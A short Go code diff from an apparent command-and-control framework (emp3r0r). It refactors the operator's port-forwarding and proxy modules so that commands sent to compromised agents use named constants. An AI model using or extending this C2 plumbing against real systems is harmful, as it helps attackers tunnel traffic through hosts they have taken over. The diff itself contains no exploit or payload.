@@ -18,7 +18,8 @@ func modulePortFwd() {
 
 				// tell the agent to close connection
 				// make sure handler returns
-				cmd := fmt.Sprintf("!port_fwd %s stop stop", id) // cmd format: !port_fwd [to/listen] [shID] [operation]
+				// cmd format: !port_fwd [to/listen] [shID] [operation]
+				cmd := fmt.Sprintf("%s %s stop stop", emp3r0r_data.C2CmdPortFwd, id)
 				err := SendCmd(cmd, "", CurrentTarget)
 				if err != nil {
 					CliPrintError("SendCmd: %v", err)
@@ -61,6 +62,7 @@ func moduleProxy() {
 	var pf PortFwdSession
 	pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
 	pf.Lport, pf.To = port, "127.0.0.1:"+emp3r0r_data.ProxyPort
+	pf.Description = fmt.Sprintf("Agent Proxy:\n%s (Local) -> %s (Agent)", pf.Lport, pf.To)
 
 	switch status {
 	case "on":
@@ -73,14 +75,12 @@ func moduleProxy() {
 		}()
 	case "off":
 		for id, session := range PortFwds {
-			if session.Description == fmt.Sprintf("%s (Local) -> %s (Agent)",
-				pf.Lport,
-				pf.To) {
+			if session.Description == pf.Description {
 				session.Cancel() // cancel the PortFwd session
 
 				// tell the agent to close connection
 				// make sure handler returns
-				cmd := fmt.Sprintf("!delete_portfwd %s", id)
+				cmd := fmt.Sprintf("%s %s", emp3r0r_data.C2CmdDeletePortFwd, id)
 				err := SendCmd(cmd, "", session.Agent)
 				if err != nil {
 					CliPrintError("SendCmd: %v", err)
